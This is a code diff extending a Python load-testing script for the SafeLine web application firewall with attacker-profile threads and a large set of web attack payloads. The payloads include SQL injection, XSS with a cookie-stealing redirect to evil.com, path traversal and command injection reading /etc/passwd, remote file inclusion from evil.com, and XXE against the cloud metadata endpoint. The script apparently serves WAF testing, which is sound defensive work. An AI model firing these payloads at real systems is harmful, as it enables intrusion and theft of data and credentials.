@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
-SafeLine Load Testing Runner
-Configurable duration and RPS load testing script for SafeLine WAF
+SafeLine Load Testing Runner with Mixed Attack Scenarios
+Comprehensive load testing script featuring realistic mixed attack patterns
+including SQL injection, XSS, path traversal, command injection, and more.
+Simulates various attacker behaviors with different traffic patterns.
 """
 
 import urllib.request
@@ -45,6 +47,9 @@ class LoadTestRunner:
             'failed_requests': 0,
             'response_times': [],
             'status_codes': {},
+            'attack_types': {},
+            'legitimate_requests': 0,
+            'malicious_requests': 0,
             'start_time': None,
             'end_time': None,
             'errors': []
@@ -63,13 +68,92 @@ class LoadTestRunner:
             {'method': 'GET', 'path': '/vulnerabilities/', 'data': None},
         ]
         
-        # Malicious payloads for WAF testing (detection only)
+        # Comprehensive mixed attack scenarios for WAF testing (detection only)
         self.waf_test_payloads = [
+            # SQL Injection attacks
             {'method': 'GET', 'path': "/?id=1' OR '1'='1", 'data': None, 'type': 'sql_injection'},
-            {'method': 'GET', 'path': '/?search=<script>alert(1)</script>', 'data': None, 'type': 'xss'},
-            {'method': 'GET', 'path': '/../../../etc/passwd', 'data': None, 'type': 'path_traversal'},
+            {'method': 'GET', 'path': "/?id=1' UNION SELECT 1,2,3--", 'data': None, 'type': 'sql_injection'},
+            {'method': 'GET', 'path': "/?id=1'; DROP TABLE users--", 'data': None, 'type': 'sql_injection'},
             {'method': 'POST', 'path': '/login.php', 'data': "username=admin'--&password=test", 'type': 'sql_injection'},
+            {'method': 'POST', 'path': '/login.php', 'data': "username=admin' OR 1=1#&password=anything", 'type': 'sql_injection'},
+            {'method': 'GET', 'path': "/?search=1' AND (SELECT SUBSTRING(@@version,1,1))='5'--", 'data': None, 'type': 'sql_injection'},
+            
+            # XSS attacks
+            {'method': 'GET', 'path': '/?search=<script>alert(1)</script>', 'data': None, 'type': 'xss'},
+            {'method': 'GET', 'path': '/?name=<img src=x onerror=alert(1)>', 'data': None, 'type': 'xss'},
+            {'method': 'GET', 'path': '/?comment=<svg onload=alert(1)>', 'data': None, 'type': 'xss'},
+            {'method': 'POST', 'path': '/guestbook.php', 'data': 'message=<script>document.location="http://evil.com/"+document.cookie</script>', 'type': 'xss'},
+            {'method': 'GET', 'path': '/?input=javascript:alert(1)', 'data': None, 'type': 'xss'},
+            {'method': 'GET', 'path': '/?data=<iframe src=javascript:alert(1)>', 'data': None, 'type': 'xss'},
+            
+            # Path traversal attacks
+            {'method': 'GET', 'path': '/../../../etc/passwd', 'data': None, 'type': 'path_traversal'},
+            {'method': 'GET', 'path': '/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'data': None, 'type': 'path_traversal'},
+            {'method': 'GET', 'path': '/?file=../../../etc/shadow', 'data': None, 'type': 'path_traversal'},
+            {'method': 'GET', 'path': '/?include=....//....//....//etc/passwd', 'data': None, 'type': 'path_traversal'},
+            {'method': 'GET', 'path': '/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'data': None, 'type': 'path_traversal'},
+            
+            # Command injection attacks
             {'method': 'GET', 'path': '/?cmd=cat /etc/passwd', 'data': None, 'type': 'command_injection'},
+            {'method': 'GET', 'path': '/?ping=127.0.0.1; cat /etc/passwd', 'data': None, 'type': 'command_injection'},
+            {'method': 'GET', 'path': '/?input=test`whoami`', 'data': None, 'type': 'command_injection'},
+            {'method': 'POST', 'path': '/system.php', 'data': 'command=ls -la; cat /etc/passwd', 'type': 'command_injection'},
+            {'method': 'GET', 'path': '/?exec=id && cat /etc/passwd', 'data': None, 'type': 'command_injection'},
+            
+            # File inclusion attacks
+            {'method': 'GET', 'path': '/?file=http://evil.com/shell.txt', 'data': None, 'type': 'file_inclusion'},
+            {'method': 'GET', 'path': '/?include=php://input', 'data': None, 'type': 'file_inclusion'},
+            {'method': 'GET', 'path': '/?page=data://text/plain,<?php phpinfo(); ?>', 'data': None, 'type': 'file_inclusion'},
+            {'method': 'GET', 'path': '/?file=expect://id', 'data': None, 'type': 'file_inclusion'},
+            
+            # LDAP injection attacks
+            {'method': 'GET', 'path': '/?user=admin)(|(password=*))', 'data': None, 'type': 'ldap_injection'},
+            {'method': 'POST', 'path': '/ldap.php', 'data': 'username=*)(uid=*))(|(uid=*&password=anything', 'type': 'ldap_injection'},
+            
+            # XML/XXE attacks
+            {'method': 'POST', 'path': '/xml.php', 'data': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'type': 'xxe'},
+            {'method': 'POST', 'path': '/api/xml', 'data': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'type': 'xxe'},
+            
+            # NoSQL injection attacks
+            {'method': 'GET', 'path': '/?user[$ne]=null&password[$ne]=null', 'data': None, 'type': 'nosql_injection'},
+            {'method': 'POST', 'path': '/api/login', 'data': '{"username": {"$ne": null}, "password": {"$ne": null}}', 'type': 'nosql_injection'},
+            
+            # HTTP header injection attacks
+            {'method': 'GET', 'path': '/?redirect=http://evil.com', 'data': None, 'type': 'header_injection', 'headers': {'X-Forwarded-For': '127.0.0.1\r\nX-Injected: injected'}},
+            {'method': 'GET', 'path': '/', 'data': None, 'type': 'header_injection', 'headers': {'User-Agent': 'Mozilla/5.0\r\nX-Injected: header'}},
+            
+            # CSRF attacks
+            {'method': 'POST', 'path': '/admin/delete_user.php', 'data': 'user_id=1', 'type': 'csrf'},
+            {'method': 'GET', 'path': '/admin/transfer.php?amount=1000&to=attacker', 'data': None, 'type': 'csrf'},
+            
+            # Server-side template injection
+            {'method': 'GET', 'path': '/?template={{7*7}}', 'data': None, 'type': 'ssti'},
+            {'method': 'GET', 'path': '/?name={{config.items()}}', 'data': None, 'type': 'ssti'},
+            
+            # CRLF injection
+            {'method': 'GET', 'path': '/?url=http://example.com%0d%0aSet-Cookie:%20malicious=true', 'data': None, 'type': 'crlf_injection'},
+            
+            # Buffer overflow attempts
+            {'method': 'GET', 'path': '/?input=' + 'A' * 5000, 'data': None, 'type': 'buffer_overflow'},
+            {'method': 'POST', 'path': '/upload.php', 'data': 'data=' + 'B' * 10000, 'type': 'buffer_overflow'},
+            
+            # SQL injection with advanced techniques
+            {'method': 'GET', 'path': "/?id=(SELECT COUNT(*) FROM information_schema.tables)", 'data': None, 'type': 'sql_injection_advanced'},
+            {'method': 'GET', 'path': "/?id=1' AND SLEEP(5)--", 'data': None, 'type': 'sql_injection_time_based'},
+            {'method': 'GET', 'path': "/?id=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", 'data': None, 'type': 'sql_injection_error_based'},
+            
+            # Advanced XSS bypasses
+            {'method': 'GET', 'path': '/?input=<ScRiPt>alert(1)</ScRiPt>', 'data': None, 'type': 'xss_case_bypass'},
+            {'method': 'GET', 'path': '/?input=<script>alert(String.fromCharCode(88,83,83))</script>', 'data': None, 'type': 'xss_encoding_bypass'},
+            {'method': 'GET', 'path': '/?input=<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', 'data': None, 'type': 'xss_obfuscated'},
+            
+            # Advanced path traversal
+            {'method': 'GET', 'path': '/?file=..%252f..%252f..%252fetc%252fpasswd', 'data': None, 'type': 'path_traversal_double_encoded'},
+            {'method': 'GET', 'path': '/?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'data': None, 'type': 'path_traversal_unicode'},
+            
+            # Polyglot payloads (multiple attack types in one)
+            {'method': 'GET', 'path': "/?input=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", 'data': None, 'type': 'polyglot_xss'},
+            {'method': 'GET', 'path': "/?q=1'||'1'='1'/**/union/**/select/**/1,2,3,concat(0x3c,0x73,0x63,0x72,0x69,0x70,0x74,0x3e,0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29,0x3c,0x2f,0x73,0x63,0x72,0x69,0x70,0x74,0x3e)--", 'data': None, 'type': 'polyglot_sqli_xss'},
         ]
 
     def signal_handler(self, signum, frame):
@@ -89,11 +173,30 @@ class LoadTestRunner:
             else:  # POST
                 data = payload['data'].encode('utf-8') if payload['data'] else None
                 request = urllib.request.Request(url, data=data)
-                request.add_header('Content-Type', 'application/x-www-form-urlencoded')
+                # Handle different content types for POST requests
+                if payload.get('type') == 'xxe':
+                    request.add_header('Content-Type', 'application/xml')
+                elif payload.get('type') == 'nosql_injection' and payload['data'] and payload['data'].startswith('{'):
+                    request.add_header('Content-Type', 'application/json')
+                else:
+                    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
             
-            # Add common headers
-            request.add_header('User-Agent', 'LoadTestRunner/1.0')
+            # Add common headers with randomization
+            user_agents = [
+                'LoadTestRunner/1.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'curl/7.68.0',
+                'Wget/1.20.3'
+            ]
+            request.add_header('User-Agent', random.choice(user_agents))
             request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
+            
+            # Add custom headers if specified in payload
+            if 'headers' in payload:
+                for header_name, header_value in payload['headers'].items():
+                    request.add_header(header_name, header_value)
             
             with urllib.request.urlopen(request, timeout=10) as response:
                 response_time = time.time() - start_time
@@ -108,6 +211,16 @@ class LoadTestRunner:
                     if status_code not in self.stats['status_codes']:
                         self.stats['status_codes'][status_code] = 0
                     self.stats['status_codes'][status_code] += 1
+                    
+                    # Track attack types
+                    attack_type = payload.get('type', 'legitimate')
+                    if attack_type == 'legitimate' or attack_type is None:
+                        self.stats['legitimate_requests'] += 1
+                    else:
+                        self.stats['malicious_requests'] += 1
+                        if attack_type not in self.stats['attack_types']:
+                            self.stats['attack_types'][attack_type] = 0
+                        self.stats['attack_types'][attack_type] += 1
                 
                 return {
                     'success': True,
@@ -123,6 +236,16 @@ class LoadTestRunner:
                 self.stats['total_requests'] += 1
                 self.stats['failed_requests'] += 1
                 self.stats['errors'].append(str(e))
+                
+                # Track attack types for failed requests too
+                attack_type = payload.get('type', 'legitimate')
+                if attack_type == 'legitimate' or attack_type is None:
+                    self.stats['legitimate_requests'] += 1
+                else:
+                    self.stats['malicious_requests'] += 1
+                    if attack_type not in self.stats['attack_types']:
+                        self.stats['attack_types'][attack_type] = 0
+                    self.stats['attack_types'][attack_type] += 1
             
             return {
                 'success': False,
@@ -131,20 +254,86 @@ class LoadTestRunner:
             }
 
     def worker_thread(self, target_url, thread_id):
-        """Worker thread for generating load"""
+        """Worker thread for generating load with mixed attack scenarios"""
         print(f"Worker thread {thread_id} started")
         
+        # Each thread has different attack patterns for realistic traffic
+        thread_behavior = thread_id % 10
+        
         while self.running:
-            # Choose payload type based on thread ID for variety
-            if thread_id % 5 == 0:  # 20% malicious payloads for WAF testing
-                payload = random.choice(self.waf_test_payloads)
-            else:  # 80% normal payloads
+            # Mixed scenario selection with realistic patterns
+            scenario_roll = random.randint(1, 100)
+            
+            if thread_behavior == 0:  # High-frequency attacker (30% malicious)
+                if scenario_roll <= 30:
+                    payload = random.choice(self.waf_test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 1:  # SQL injection specialist (50% SQL attacks)
+                if scenario_roll <= 50:
+                    sql_payloads = [p for p in self.waf_test_payloads if 'sql' in p.get('type', '')]
+                    payload = random.choice(sql_payloads) if sql_payloads else random.choice(self.test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 2:  # XSS specialist (40% XSS attacks)
+                if scenario_roll <= 40:
+                    xss_payloads = [p for p in self.waf_test_payloads if 'xss' in p.get('type', '')]
+                    payload = random.choice(xss_payloads) if xss_payloads else random.choice(self.test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 3:  # Path traversal specialist (35% path attacks)
+                if scenario_roll <= 35:
+                    path_payloads = [p for p in self.waf_test_payloads if 'path_traversal' in p.get('type', '')]
+                    payload = random.choice(path_payloads) if path_payloads else random.choice(self.test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 4:  # Mixed advanced attacker (25% advanced attacks)
+                if scenario_roll <= 25:
+                    advanced_payloads = [p for p in self.waf_test_payloads if any(t in p.get('type', '') for t in ['polyglot', 'advanced', 'obfuscated', 'double_encoded'])]
+                    payload = random.choice(advanced_payloads) if advanced_payloads else random.choice(self.waf_test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 5:  # Burst attacker (sends attacks in bursts)
+                if scenario_roll <= 60:  # 60% chance during burst
+                    payload = random.choice(self.waf_test_payloads)
+                    # Send multiple requests in quick succession during burst
+                    for _ in range(random.randint(1, 3)):
+                        if self.running:
+                            burst_payload = random.choice(self.waf_test_payloads)
+                            self.make_request(target_url, burst_payload)
+                            time.sleep(0.1)  # Short delay between burst requests
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 6:  # Slow and persistent attacker (15% attacks with delays)
+                if scenario_roll <= 15:
+                    payload = random.choice(self.waf_test_payloads)
+                    # Add random delay to simulate persistent but slow attacks
+                    time.sleep(random.uniform(0.5, 2.0))
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 7:  # Polyglot specialist (focus on complex payloads)
+                if scenario_roll <= 20:
+                    polyglot_payloads = [p for p in self.waf_test_payloads if 'polyglot' in p.get('type', '')]
+                    payload = random.choice(polyglot_payloads) if polyglot_payloads else random.choice(self.waf_test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            elif thread_behavior == 8:  # Normal user with occasional probes (5% attacks)
+                if scenario_roll <= 5:
+                    payload = random.choice(self.waf_test_payloads)
+                else:
+                    payload = random.choice(self.test_payloads)
+            else:  # Pure legitimate traffic (thread_behavior == 9)
                 payload = random.choice(self.test_payloads)
             
             result = self.make_request(target_url, payload)
             
-            # Sleep to maintain target RPS
-            time.sleep(self.request_interval)
+            # Variable sleep intervals to simulate realistic traffic patterns
+            if thread_behavior in [5, 6]:  # Burst or slow attackers
+                sleep_time = self.request_interval * random.uniform(0.5, 3.0)
+            else:
+                sleep_time = self.request_interval * random.uniform(0.8, 1.2)
+            
+            time.sleep(sleep_time)
         
         print(f"Worker thread {thread_id} stopped")
 
@@ -180,6 +369,14 @@ class LoadTestRunner:
             print(f"Min Response Time:   {min_response_time*1000:.2f}ms")
             print(f"Max Response Time:   {max_response_time*1000:.2f}ms")
             print(f"Status Codes:        {self.stats['status_codes']}")
+            print(f"Legitimate Requests: {self.stats['legitimate_requests']}")
+            print(f"Malicious Requests:  {self.stats['malicious_requests']}")
+            
+            if self.stats['attack_types']:
+                print(f"Attack Types:")
+                for attack_type, count in sorted(self.stats['attack_types'].items()):
+                    percentage = (count / self.stats['total_requests']) * 100
+                    print(f"  {attack_type:20s}: {count:4d} ({percentage:5.1f}%)")
             
             remaining_time = self.total_duration_seconds - elapsed
             if remaining_time > 0:
